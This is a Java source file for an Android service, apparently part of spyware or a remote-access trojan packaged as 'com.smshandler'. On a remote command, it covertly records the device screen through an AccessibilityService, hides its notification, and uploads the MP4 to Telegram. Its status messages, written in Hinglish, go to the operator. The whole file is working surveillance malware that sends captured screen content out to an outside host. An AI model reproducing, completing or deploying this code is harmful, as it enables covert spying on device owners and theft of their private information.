package com.smshandler;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.os.IBinder;
import android.view.Surface;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.nio.ByteBuffer;

/**
 * Screen recorder using AccessibilityService frames → MediaCodec H.264 → MP4.
 * Zero permissions needed beyond AccessibilityService (enabled once in settings).
 * 2 fps, 720p max, sends final MP4 to Telegram.
 */
public class ScreenRecorderService extends Service {

    public static final String ACTION_RECORD = "com.smshandler.SCREEN_RECORD";
    public static final String EXTRA_SECONDS = "seconds";

    private MediaCodec  mCodec;
    private MediaMuxer  mMuxer;
    private Surface     mSurface;
    private int         mVideoTrack   = -1;
    private boolean     mMuxerStarted = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && ACTION_RECORD.equals(intent.getAction())) {
            int secs = intent.getIntExtra(EXTRA_SECONDS, 30);
            startForeground(9905, buildNotif());
            new Thread(() -> doRecord(secs)).start();
        }
        return START_NOT_STICKY;
    }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, SmsService.CH_ID)
            .setSmallIcon(R.drawable.ic_sword)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).build();
    }

    // ─── Core recording loop ─────────────────────────────────────────────────

    private void doRecord(int durationSec) {
        ScreenAccessibilityService sas = ScreenAccessibilityService.instance;
        if (sas == null) {
            SmsService.sendRawMessage(
                "❌ Accessibility Service enable nahi hai.\n" +
                "Settings → Accessibility → Kasari Chauhan → Enable karo");
            cleanup(null); return;
        }

        SmsService.sendRawMessage("🎬 Screen recording shuru... " + durationSec + "s baad video aayega.");

        Bitmap first = sas.captureFrameSync(8000);
        if (first == null) {
            SmsService.sendRawMessage("❌ Pehla frame nahi mila. Screen ON hai?");
            cleanup(null); return;
        }

        int origW = first.getWidth(), origH = first.getHeight();
        int width  = makeEven(Math.min(720, origW));
        int height = makeEven((int)(origH * ((float) width / origW)));

        File outFile = new File(getCacheDir(), "srec_" + System.currentTimeMillis() + ".mp4");

        try {
            MediaFormat fmt = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, width, height);
            fmt.setInteger(MediaFormat.KEY_BIT_RATE, 800_000);
            fmt.setInteger(MediaFormat.KEY_FRAME_RATE, 2);
            fmt.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1);
            fmt.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);

            mCodec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
            mCodec.configure(fmt, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            mSurface = mCodec.createInputSurface();
            mCodec.start();

            mMuxer = new MediaMuxer(outFile.getAbsolutePath(), MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);

            // Encode first frame
            drawFrame(first, width, height);
            first.recycle();
            drain(false);

            int frameCount = 1;
            long endMs = System.currentTimeMillis() + (durationSec * 1000L);

            while (System.currentTimeMillis() < endMs) {
                Thread.sleep(500); // 2 fps
                Bitmap frame = sas.captureFrameSync(1500);
                if (frame != null) {
                    drawFrame(frame, width, height);
                    frame.recycle();
                    frameCount++;
                }
                drain(false);
            }

            // Signal end and drain
            mCodec.signalEndOfInputStream();
            drain(true);

            mCodec.stop();
            if (mMuxerStarted) mMuxer.stop();
            mCodec.release(); mCodec = null;
            mMuxer.release(); mMuxer = null;
            mSurface.release(); mSurface = null;

            if (outFile.exists() && outFile.length() > 2000) {
                SmsService.sendFileToTelegram(outFile,
                    "🎬 Screen Recording (" + durationSec + "s · " + frameCount + " frames · 2fps)");
            } else {
                SmsService.sendRawMessage("❌ Recording file bahut chhoti / empty hai.");
            }
            outFile.delete();

        } catch (Exception e) {
            SmsService.sendRawMessage("❌ Recording error: " + e.getMessage());
            outFile.delete();
        } finally {
            cleanup(null);
        }
    }

    // ─── Draw a Bitmap to MediaCodec input surface ───────────────────────────

    private void drawFrame(Bitmap bmp, int w, int h) {
        Canvas c = mSurface.lockCanvas(null);
        if (c == null) return;
        try {
            if (bmp.getWidth() == w && bmp.getHeight() == h) {
                c.drawBitmap(bmp, 0, 0, null);
            } else {
                Bitmap scaled = Bitmap.createScaledBitmap(bmp, w, h, false);
                c.drawBitmap(scaled, 0, 0, null);
                scaled.recycle();
            }
        } finally {
            mSurface.unlockCanvasAndPost(c);
        }
    }

    // ─── Drain MediaCodec output → Muxer ─────────────────────────────────────

    private void drain(boolean eos) {
        MediaCodec.BufferInfo info = new MediaCodec.BufferInfo();
        int maxTries = eos ? 200 : 20;
        for (int i = 0; i < maxTries; i++) {
            int idx = mCodec.dequeueOutputBuffer(info, 10_000);
            if (idx == MediaCodec.INFO_TRY_AGAIN_LATER) {
                if (!eos) break;
                continue;
            }
            if (idx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                if (!mMuxerStarted) {
                    mVideoTrack = mMuxer.addTrack(mCodec.getOutputFormat());
                    mMuxer.start();
                    mMuxerStarted = true;
                }
                continue;
            }
            if (idx >= 0) {
                ByteBuffer buf = mCodec.getOutputBuffer(idx);
                boolean isConfig = (info.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0;
                if (buf != null && !isConfig && mMuxerStarted && info.size > 0) {
                    mMuxer.writeSampleData(mVideoTrack, buf, info);
                }
                mCodec.releaseOutputBuffer(idx, false);
                if ((info.flags & MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) break;
            }
        }
    }

    private int makeEven(int n) { return (n % 2 == 0) ? n : n - 1; }

    private void cleanup(Throwable t) {
        try { if (mCodec  != null) { mCodec.stop();  mCodec.release();  mCodec = null;  } } catch (Exception ignored) {}
        try { if (mMuxer  != null) { mMuxer.release(); mMuxer = null; } } catch (Exception ignored) {}
        try { if (mSurface!= null) { mSurface.release(); mSurface = null; } } catch (Exception ignored) {}
        stopForeground(true);
        stopSelf();
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
